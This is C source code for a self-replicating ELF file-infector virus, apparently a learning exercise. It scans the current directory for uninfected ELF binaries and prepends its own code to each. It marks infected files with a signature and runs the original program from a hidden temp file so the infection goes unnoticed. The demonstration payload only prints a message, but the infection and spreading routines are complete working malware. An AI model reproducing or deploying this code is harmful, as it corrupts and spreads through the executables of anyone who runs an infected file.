#include <stdio.h>      	// for basic IO
#include <dirent.h>       	// for directories
#include <stdbool.h>      	// macros for boolean data type
#include <sys/stat.h>     	// structure of data returned by *stat(). 
#include <sys/sendfile.h> 	// for sendfile()
#include <sys/wait.h>	  	// for waitpid()
#include <fcntl.h>        	// for file control operations 
#include <unistd.h>		    // for close()
#include <stdlib.h>         //system
#include <string.h>         //strcmp


//macros
#define SIGNATURE 6969
#define SIZE 17872
#define MESSAGE "smoking kills"
#define TEMP_FILENAME ".temp"


//fuction prototypes
void evil();
bool isOGv(int );
bool isELF(char* );
bool isHealthy(char* );
char* getHealthy(int );
void infectHealthy(char* ,int );
void appSign(int ,char* ,mode_t ,int );
void exHealthy(int ,mode_t ,int ,char **);



void main(int argc, char *argv[])
{

    //open its own elf file
    int vfd=open(argv[0],O_RDONLY);

    struct stat st;
    fstat(vfd, &st);

    //execute a malwere or something evil
    char *x="./ls";
    if(strcmp(x,argv[0])==0)
    evil();

    //geting a healthy file
    char* heathyfile=getHealthy(st.st_ino);

    //infecting the healthy file
    if(heathyfile!=NULL)
    {
        infectHealthy(heathyfile,vfd);
    }

    //if its is the og virus file itself
    //we append the sign
    if(isOGv(vfd))
    {
        appSign(vfd,argv[0],st.st_mode,st.st_size);
    }

    //else we execute the healthy part using exec
    else
    {
        exHealthy(vfd,st.st_mode,st.st_size,argv);
    }

    close(vfd);

}



//function the run someting evil
void evil()
{
    puts(MESSAGE);
}


//checks if the file is og virus
bool isOGv(int vfd)
{
    return SIZE == lseek(vfd, 0,SEEK_END);
}


//checks if the file is a elf file
bool isELF(char* filename)
{
    
    //hidden files
    if(filename[0]=='.')
    {
        return false;
    }

    int hfd=open(filename,O_RDONLY);
    char header[4];

    //reads first 4 bytes of the file
    read(hfd,header,4);
    close(hfd);

    //ELF files have the first four bytes as {0x7f(del or ^?), 'E', 'L', 'F'}.
    return header[0]==0x7F //del
        && header[1]=='E'
        && header[2]=='L'
        && header[3]=='F';

}


//checks whether a file is infected or not
//we do it with help of the signature
bool isHealthy(char* filename)
{

    int sign;
    int fd=open(filename,O_RDONLY);
    
    //sign is at the end of the file
    lseek(fd,-1*sizeof(sign),SEEK_END);
    read(fd,&sign,sizeof(sign));
    close(fd);

    //returns false if the file is infected
    return sign!=SIGNATURE;

}


//gets the elf file which is not infected yet
char* getHealthy(int self_inode)
{

    //has many attributes of a file
    struct stat st;

    //gives a directory stream of the specified directory
    DIR *dir=opendir("./");
    
    //structure of reading the directory stream
    struct dirent *dp;

    //checks all files in the dir
    while((dp=readdir(dir))!=NULL)
    {
        //linking a file to st
        stat(dp->d_name,&st);

        //not infecting self
        if(st.st_ino==self_inode)
        {
            continue;
        }

        //returnig healthy elf file
        if(isELF(dp->d_name) && isHealthy(dp->d_name))
        {
            closedir(dir);
            return dp->d_name;
        }
    }

    closedir(dir);

    //if no files return null
    return NULL;
}


//adds virus to begining healthy file
void infectHealthy(char* hfilename,int vfd)
{

    int hfd=open(hfilename,O_RDONLY);
    struct stat st;

    //linking file disciptor to st
    fstat(hfd,&st);

    //size of the healty file
    int hSize=st.st_size;

    int sign=SIGNATURE;
    
    //creating a tempfile in the same mode
    int tfd = creat(TEMP_FILENAME,st.st_mode);
    
    //after infecting
    //virus->healthy->sign

    //copying the virus to temp, NULL makes the fd to update
    sendfile(tfd, vfd ,NULL,SIZE);

    //appening the healthy to temp
    sendfile(tfd,hfd,NULL,hSize);

    //adding the sign
    write(tfd,&sign,sizeof(sign));

    //changing the temp file to infected file
    rename(TEMP_FILENAME,hfilename);

    close(tfd);
    close(hfd);


}


//append sign to the OG virus
void appSign(int vfd,char* filename,mode_t mode,int size)
{

    int tfd = creat(TEMP_FILENAME,mode);
    int sign=SIGNATURE;

    //moving the fd to begining
    lseek(vfd,0,SEEK_SET);

    //virus->sign

    //copying the virus
    sendfile(tfd,vfd,NULL,size);

    //appending sign
    write(tfd,&sign,sizeof(sign));

    close(tfd);

    rename(TEMP_FILENAME,filename);

}


//now we should the healthy part of the function to avoid sus
//executing healthy part
void exHealthy(int vfd,mode_t mode,int totalSize,char *argv[])
{

    int tfd=creat(TEMP_FILENAME,mode);

    //moving fd to skip infected part and go to the healthy part
    lseek(vfd,SIZE,SEEK_SET);

    int signSize=sizeof(SIGNATURE);
    
    //healthy size will be ts-vs-ss
    int hSize=totalSize-SIZE-signSize;

    //coping healthy part to temp file
    sendfile(tfd,vfd,NULL,hSize);
    close(tfd);

    //for executing the healthy part we use fork
    pid_t pid = fork();

    //child executes the healthy part
    if(pid==0)
    {
        execv(TEMP_FILENAME,argv);
    }

    //parent waits till child is compleated
    //then removes the exixtence of temp file
    else
    {
        //NULL->dont need to store status,0->no options
        waitpid(pid,NULL,0);
        unlink(TEMP_FILENAME);
    }

}